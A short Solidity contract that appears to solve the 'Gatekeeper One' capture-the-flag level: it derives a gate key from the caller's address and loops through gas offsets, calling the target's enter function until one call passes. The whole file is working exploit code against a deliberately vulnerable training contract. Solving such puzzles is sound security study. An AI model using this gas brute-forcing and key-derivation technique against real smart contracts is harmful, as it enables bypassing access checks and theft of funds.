pragma solidity ^0.8.0;

import {GatekeeperOne} from "./Level13.sol";

contract GatekeeperOneExploit {
    constructor(address _target) {
        bytes8 gateKey = bytes8(0x1111111100000000 + uint64(uint16(uint160(tx.origin))));

        for(uint256 i = 0; i < 8191; ++i) {
            (bool ok,) = _target.call{gas: 8191*10 + i}(abi.encodeWithSignature("enter(bytes8)", gateKey));

            if(ok) {
                return;
            }
        }
    }
}
